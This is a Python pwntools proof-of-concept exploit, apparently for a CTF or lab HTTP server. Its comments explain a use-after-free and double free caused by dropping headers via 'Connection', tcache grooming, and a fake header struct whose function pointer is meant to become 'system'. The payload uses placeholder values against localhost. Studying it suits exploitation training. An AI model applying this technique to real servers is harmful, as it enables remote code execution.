#!/usr/bin/env python3

from pwn import * 

'''
Vulnerability
===================
The 'Connection' header is used to DROP headers within 'interpret_header'.
However, these are NEVER cleared, which results in a use after free
within other classes to 'interpret_header', parse_body and the actual
processing of the headers in 'example.c'.

Eventually, the request information gets cleaned up in 'cleanup_request'. 
At this point, it attempts to clean up the headers in 'req_header_lst'. 
When this happens, it will free the fields of a header and the header itself.
Since we can free the header in 'interpret_header', this leads to an eventual
double free as well. 

Exploitation Thoughts
========================
There are two potential paths to exploitation: 
- Use after free (UAF) on header
- Double free

With the UAF, we can swap in a FAKE 'struct header'. Since this has a function 
pointer inside of it, this object makes for an amazing target. This is shown 
below: 
```
struct header {
    char* name; // Key of the header (name)
    size_t name_len;
    char* value; // Value of the header
    size_t value_len; 
    void* (*custom_callback)(); 
}; 
```

Our general plan of attack is as follows: 
- Trigger UAF by dropping header in the 'Connection' header.
- Allocate this chunk with user controllable data for a fake 'struct header'.
- Call malicious function pointer with our fake object. 

Grooming
==============

Nothing major needs to be done in order set up the heap in a favorable
way prior to the use after free. Whoo!

Once the use after free has occurred, our 'struct header' will be put
into the 0x30 TCache bin. In order to put our fake object here, we will
need to allocate a chunk from the 0x30 TCache Bin with data that we control. 

There are many allocations that allow us to control BOTH the data inside 
and the LENGTH of the data: 
- Host, Origin and User-Agent header values
- X-Request-Id header value

By specifying the 'User-Agent/Origin/Host' header, an allocation is made that depends
on the size of the 'header->value_len'. So, if we allocate the 'User-Agent'
with 0x20 bytes, it will allocate the TCache bin chunk from our 'struct
header', as mentioned before in the LIFO manner of the bin. 
'''

p = remote("127.0.0.1", 8081) 
p.newline = b"\r\n" # Newlines for the 'sendline'

# Verb, path and protocol
first_line = b"POST /SomeRoute HTTP/1.1"
p.sendline(first_line) 

# Free the 'BadHeader' header to create a UAF later on this header.
p.sendline(b"Connection:BadHeader") 

''' 
Make an allocation to swap over the top of the 'header_data' object
for the 'BadHeader'. 

The header 'User-Agent' allocation is as follows: 
- req_context->user_agent = malloc(req_header_lst[index]->value_len)

Since we COMPLETELY control the size of this header, we can allocate 
a chunk of ANY size. The 'header_data' is 0x30 tcache bin chunk. So,
we will attempt to take this one. 

At the beginning of 'interpret_single_header', the following call is made: 
    (req_header_lst[index]->custom_callback)(req_header_lst[index]->name,...) 

The 'custom_callback' field holds a function pointer and the field 
'name' holds the first parameter of this function being called. 
In order to exploit this, swap in a useful function pointer(such as 'system') 
for 'custom_callback' and a pointer to the bash command to run for 'name'. 

Fake object to swap in: 
'''
fake_header_obj = p64(0x3131313131313131) # Pointer to the 'name' - first parameter for function
fake_header_obj += p64(0x3232323232323232) # Size of the name
fake_header_obj += p64(0x3333333333333333) # Pointer to the 'value'
fake_header_obj += p64(0x3434343434343434) # Size of the value
fake_header_obj += p64(0x3535353535353535)  # custom_callback - Function pointer! :) 

# User agent with the VALUE with our payload
p.sendline(b"User-Agent:" + fake_header_obj)
#p.sendline(b"User-Agent:1111111122222222333333334444444455555555")

# The header that is freed then exploited. 
p.sendline(b"BadHeader:pwned_header.com") # Send the 'host' header

# Line to finish the 'header'
p.sendline(b"")
p.interactive()
